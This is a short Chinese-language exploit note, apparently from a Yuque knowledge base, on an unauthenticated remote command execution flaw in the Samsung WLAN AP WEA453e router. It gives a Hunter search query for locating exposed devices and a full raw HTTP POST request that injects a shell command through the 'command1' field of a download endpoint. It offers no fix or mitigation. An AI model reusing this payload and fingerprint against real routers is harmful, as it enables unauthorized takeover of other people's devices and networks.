# 三星路由器WLAN AP 远程命令执行漏洞

# 一、漏洞简介
三星 WLAN AP WEA453e路由器存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限。

# 二、影响版本
+ 三星 WLAN AP WEA453e路由器

# 三、资产测绘
+ hunter`web.title="Samsung WLAN AP"`
+ 特征

![1699981974720-33031d9c-1da8-4cf7-87e1-1b3f1b65341d.png](./img/WlFtd27uvNlv3_yd/1699981974720-33031d9c-1da8-4cf7-87e1-1b3f1b65341d-028838.png)

# 四、漏洞复现
```plain
POST /(download)/tmp/a.txt HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

command1=shell:ls | dd of=/tmp/a.txt
```

![1699982002400-dfea75e4-b2c9-4cb8-8d27-d9045ae51bcd.png](./img/WlFtd27uvNlv3_yd/1699982002400-dfea75e4-b2c9-4cb8-8d27-d9045ae51bcd-101621.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ae6xqzhcp3o4cl3m>